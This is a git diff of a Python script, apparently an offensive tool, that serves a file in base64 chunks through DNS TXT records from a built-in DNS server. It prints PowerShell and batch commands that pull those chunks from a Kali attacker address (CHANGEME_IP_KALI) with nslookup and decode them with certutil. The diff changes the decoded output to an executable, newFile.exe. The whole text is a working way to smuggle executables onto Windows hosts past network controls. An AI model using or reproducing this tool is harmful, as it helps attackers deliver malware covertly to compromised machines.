@@ -25,20 +25,26 @@ parser = argparse.ArgumentParser(description="Setup Zones File for DNS File Tran
 parser.add_argument("File_To_Transfer")
 args = parser.parse_args()
 
+
+#Get File to server and base64 encode
 with open(args.File_To_Transfer, "rb") as f:
     encodedFile = base64.b64encode(f.read())
 
 encodedString = encodedFile.decode()
 
+#Break up in segments 255 chars long, max TXT record length
 x = 255
 SplitString = [encodedString[i: i + x] for i in range(0, len(encodedString), x)]
 
-z = 1
+#Get Rid of old Zone File if it exists, so new file can be served
 if os.path.exists("ZoneFile.txt"):
   os.remove("ZoneFile.txt")
 
+#Set Domain to server, can be anything
 DName = ".texting.com"
 
+#Create Zone file with b64 encoded chunks to be used by DNs server
+z = 1
 while z <= len(SplitString):
     fileopen = open('ZoneFile.txt', 'w')
     for chunk in SplitString:
@@ -46,10 +52,11 @@ while z <= len(SplitString):
         z += 1
     fileopen.close()
 
+#Print Out of Commands to Run
 print(" ")
 print("Powershell File Transfer, enter text below in powershell window, change CHANGEME_IP_KALI to IP address of Kali system")
 print(" ")
-print("del File.txt; del newFile; $c = \"\"; $i = 1; while ($i -le " + str(len(SplitString)) + "){$a = nslookup -q=txt " + "\"$i" + DName + "\" CHANGEME_IP_KALI | Select-String -Pattern '\"' | Out-String ; $b = $a.trim(); $c += $b.Replace(\"`\"\",\"\"); $i += 1}; $c.Replace(\"`n\",\"\") | Out-File -Append File.txt; certutil.exe -decode .\File.txt newFile")
+print("del File.txt; del newFile; $c = \"\"; $i = 1; while ($i -le " + str(len(SplitString)) + "){$a = nslookup -q=txt " + "\"$i" + DName + "\" CHANGEME_IP_KALI | Select-String -Pattern '\"' | Out-String ; $b = $a.trim(); $c += $b.Replace(\"`\"\",\"\"); $i += 1}; $c.Replace(\"`n\",\"\") | Out-File -Append File.txt; certutil.exe -decode .\File.txt newFile.exe")
 print(" ")
 print(" ")
 print("Batch File Transfer, enter text below in notepad.exe and save as bat file, change CHANGEME_IP_KALI to IP address of Kali system, then run")
@@ -67,6 +74,9 @@ print("move File.txt File.exe")
 print(" ")
 print(" ")
 print("DNS Server Log Info:")
+
+
+#Below is DNS Server Code
 SERIAL_NO = int((datetime.utcnow() - datetime(1970, 1, 1)).total_seconds())
 
 handler = logging.StreamHandler()
